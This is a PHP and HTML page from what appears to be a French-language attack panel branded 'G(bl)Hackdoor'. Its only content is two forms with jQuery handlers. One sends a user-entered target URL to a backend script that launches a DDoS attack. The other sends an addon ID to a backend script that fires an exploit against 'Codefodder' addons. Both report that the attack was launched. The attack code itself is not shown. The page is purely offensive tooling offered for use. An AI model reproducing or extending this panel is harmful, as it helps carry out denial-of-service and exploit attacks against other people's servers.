<?php include('isdefault.php') ?>
            <div class="breadcome-area">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                            <div class="breadcome-list"><font color="white">
                              <div class="form-group">
                <label>URL</label>
                <textarea class="form-control" rows="1" id="dddos-text" placeholder="https://jambon.com/test.php"></textarea>
              </div>
              <button type="button" onclick="sendddos()" class="btn btn-success"><i class="fa fa-bolt"></i>&nbsp;Envoyer</button>
              <text id="dddos-body"> </text>
              <br/>
              <br/>
              <label>Exploit Codefodder (Metter L'id de l'addon)</label>
                <textarea class="form-control" rows="1" id="exploit-text" placeholder="Exemple : 3286"></textarea>
                <br/>
              <button type="button" onclick="sendexploit()" class="btn btn-success"><i class="fa fa-bolt"></i>&nbsp;Envoyer</button>
              <text id="exploit-body"> </text>
        </div>
                            </font>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
        <div class="footer-copyright-area">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="footer-copy-right">
                            <p>Copyright © 2019 <a href="https://colorlib.com/wp/templates/">G(bl)Hackdoor</a> All rights reserved.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<?php include('isdefault_down.php') ?>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.dataTables.min.js"></script>
<script src="js/datatables.bootstrap.min.js"></script>
<script src="js/custom.js"></script>
  <script type="text/javascript">
    function sendddos()
  {
      var url = $("#dddos-text").val();
      $.ajax({
        method: "POST",
        url: "core/ajax/ddos.php",
        data: { url: url }
      }).done(()=>{
        $("#dddos-body").html("L'attaque a été lancer");
      });
  }
  function sendexploit()
  {
      var url = $("#exploit-text").val();
      $.ajax({
        method: "POST",
        url: "core/ajax/exploit_codefodder.php",
        data: { url: url }
      }).done(()=>{
        $("#exploit-body").html("L'exploit a été lancer");
      });
  }
  </script>
</html>
